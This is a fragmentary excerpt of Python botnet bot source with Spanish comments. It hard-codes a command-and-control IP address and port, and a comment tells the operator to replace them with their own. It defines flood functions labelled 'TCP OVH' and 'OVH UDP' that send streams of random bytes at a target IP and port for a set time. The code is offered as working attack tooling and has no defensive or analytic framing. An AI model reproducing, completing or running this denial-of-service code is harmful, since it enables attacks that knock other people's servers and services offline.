...
# ─── Configuración ─────────────────────────────────────────────────────────────
C2_ADDRESS  = "45.13.236.245"  # CAMBIA ESTA POR TU IP
C2_PORT     = 26110            # CAMBIA ESTA POR TU PUERTO
RECONNECT_DELAY = 5
...
# ─── UDP PPS (Reemplazado - Optimizado) ──────────────────────────────────
...
# ─── TCP OVH (Reemplazado - Optimizado) ─────────────────────────────────
def attack_tcp_ovh(ip, port, secs, stop_event):
    ...
    while time.time() < end_time:
        ...
        try:
            ...
            sock.settimeout(3)
            sock.connect((ip, port))
            # Enviar múltiples paquetes grandes
            for _ in range(50):
                if stop_event.is_set() or time.time() >= end_time:
                    break
                try:
                    sock.send(random._urandom(65000)[:1400])
                except:
                    break
            sock.close()
        except:
...
# ─── OVH UDP (Reemplazado - Optimizado) ─────────────────────────────────
def attack_ovh_udp(ip, port, secs, stop_event):
    try:
        ...
        while time.time() < secs:
            if stop_event.is_set():
                break
            packet = random._urandom(random.randint(90, 120))
            try:
                sock.sendto(packet, (ip, port))
            except:
                pass
